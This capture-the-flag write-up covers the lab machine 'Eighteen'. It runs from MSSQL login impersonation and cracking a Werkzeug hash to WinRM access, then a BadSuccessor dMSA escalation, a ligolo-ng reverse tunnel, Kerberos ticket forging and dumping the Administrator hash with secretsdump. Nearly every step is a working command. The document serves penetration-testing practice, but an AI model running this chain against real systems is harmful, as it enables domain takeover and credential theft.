
![[eighteen logo.png]]


We start with the following credentials : kevin / iNa2we6haRj2gaw!

nmap scan

```
nmap -sVC -oN scan.txt 10.129.54.149
```

```
<SNIP> 

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://eighteen.htb/
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ssl-date: 2025-11-18T20:56:32+00:00; +7h00m02s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-11-18T18:26:34
|_Not valid after:  2055-11-18T18:26:34
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

<SNIP>
```

Let's enumerate the mssclient port, i don't know much about it yet but i will follow some indication from [hacktrics](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html?highlight=pentesting%20mssql#1433---pentesting-mssql---microsoft-sql-server).

```
mssqlclient.py "eighteen.htb"/"kevin":'iNa2we6haRj2gaw!'@"10.129.54.149"
```

I tried some command like running xp_cmdshell but it led me nowhere. So i enumerate the databases

![Pasted image 20251118160953](Images/Pasted%20image%2020251118160953.png)

financial_planner looks like a custom one, but i can't access it

```
ERROR(DC01): Line 1: The server principal "kevin" is not able to access the database "financial_planner" under the current security context.
```

I fell on the part, **find users you can impersonate** on hacktricks so i tried it i saw i could impesonate the user **appdev*** which mean i could use his permission to enumerate further the database.

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

![Pasted image 20251118161255](Images/Pasted%20image%2020251118161255.png)

To impersonate him i ran this command

```
EXECUTE AS LOGIN = 'appdev'
```
which worked because our name changed from **kevin** to **appdev** on the db 

And now i can use the financial_planner database.

```
use financial_planner
```

and then i enumerated the users

```
select * from users
```

![Pasted image 20251118161535](Images/Pasted%20image%2020251118161535.png)

i got an hash for user admin.

I got stuck for a while because hashcat wasn't working with that hash, so i asked chatgpt what hash it was and he told me that it was a Werkzeug hash which is used by flask, a python librairy.

Hashcat didn't still want to work so after surfing on the web, i found a tool on github, 
**werkzeug2hashcat** which i downloaded.
https://github.com/Armageddon0x00/werkzeug2hashcat

```
git clone https://github.com/Armageddon0x00/werkzeug2hashcat
```
Then i converted it to a format haschat could read

```
python3 werkzeug2hashcat.py -s 'pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f0fce3a9edd0b7b19193717be28ce4d66c887133'
```

I put the result it in a file 

```
echo 'sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=' > hash.txt
```
And i attempted to crack it

```
hashcat -m 10900 hash.txt `fzf-wordlist`
```
![Pasted image 20251118162214](Images/Pasted%20image%2020251118162214.png)

And i found the password `iloveyou1`
But we don't know on which user it belongs..

So we use **netcrackexec** to find user on the target with our credentials

```
nxc mssql -u kevin -p 'iNa2we6haRj2gaw!' --rid-brute --local-auth 10 10.129.54.149
```

![Pasted image 20251118195955](Images/Pasted%20image%2020251118195955.png)

We add the users in a file and we use the same tool to find the valid credentials on winrm

```
nxc winrm -u users.txt -p 'iloveyou1' --no-bruteforce --continue-on-succes 10.129.54.149
```

![Pasted image 20251118200044](Images/Pasted%20image%2020251118200044.png)

The user **adam.scott** has that password so we connect via evil-winrm to the target

```
evil-winrm -u 'adam.scott' -p 'iloveyou1' -i "10.129.54.149"
```
And we grab the user flag on the user desktop

## Privilege Escaltion

After running **winPEAS** and grabbing some info about the running server, i noticed that the version of Windows is `Windows Server 2025 Build 26100`

```
Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
```

After looking for CVE on google, i found one called **BadSuccessor**

https://github.com/ibaiC/BadSuccessor

I compiled and uploaded it to the target with Evil-winrm and started the exploit.

First i wanted to find OUs where i have write permission

```
.\BadSuccessor.exe find
```

And i found  `OU=Staff,DC=eighteen,DC=htb`

So know i had to create a malicious dMSA on that OU

```
.\BadSuccessor.exe escalate -targetOU "OU=Staff,DC=eighteen,DC=htb" -dmsa hacked -targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" -dnshostname hackedsrv -user adam.scott -dc-ip 10.129.28.54
```

Once i had done it, i had to get a ticket for my current user

```
.\Rubeus.exe tgtdeleg /nowrap
```

But i faced an error, which got me stuck for a while.
I found out that evil-winrm can have some trouble connecting to Kerberos port on the machine, so i had to tunnel the target to my machine.

In order to do so, i used **ligolo-ng**

We start by do our setup

**Setup the traffic**
```
ip tuntap add user root mode tun ligolo
ip link set ligolo up
```
**Run the Proxy**
```
ligolo-ng -selfcert
```

Next, we transfer the **agent.exe** on the target with **evil-winrm** and we connect to our machine

```
.\agent.exe -connect 10.10.14.201:11601 -ignore-cert
```

We get back to **ligolo** and we should get a connection

**Chose session**
```
session
1
```
**Check the IP and start**
```
ifconfig
start
```
We can now interract with the target easier.
Though we need o add the magic IP from ligolo-ng in order to interract with Kerberos service.

```
ip route add 240.0.0.1/32 dev ligolo
```
Let's use `getTGT.py` to retrieve a ticket for adam.scott.

```
getTGT.py 'eighteen.htb/adam.scott:iloveyou1' -dc-ip 240.0.0.1
```
Now we import the `.ccache` ticket we got to the var `KRB5CCNAME`

```
export KRB5CCNAME=adam.scott.ccache
```

And we can get the ticket from our **dmsa**, which will be a ticket for **Administrator**

```
getST.py eighteen.htb/adam.scott -dc-ip 240.0.0.1 -impersonate hacked$ -self -dmsa -k -no-pass
```

If from the previous steps, you face "**Clock skew too great**", follow [this](https://medium.com/@danieldantebarnes/fixing-the-kerberos-sessionerror-krb-ap-err-skew-clock-skew-too-great-issue-while-kerberoasting-b60b0fe20069)

We should now have got a ticket from our **dmsa**. Same thing as before, we export it to our variable.

```
export KRB5CCNAME=hacked\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache
```

And we can use `secretsdump.py` to dump NTLM hash

```
secretsdump.py -k -no-pass dc01.eighteen.htb
```
This command does not work because of the Policy, so we can only use `-just-dc-user`

```
secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator -dc-ip 240.0.0.1 -target-ip 240.0.0.1
```

We have to specify `-dc-ip` AND `-target-ip` otherwise it does not work.

Once we get the hash from administrator, we can remote to the target using evil-winrm

```
evil-winrm -i eighteen.htb -u Administrator -H 0b133be956bfaddf9cea56701affddec
```
The root flag is under the Desktop folder.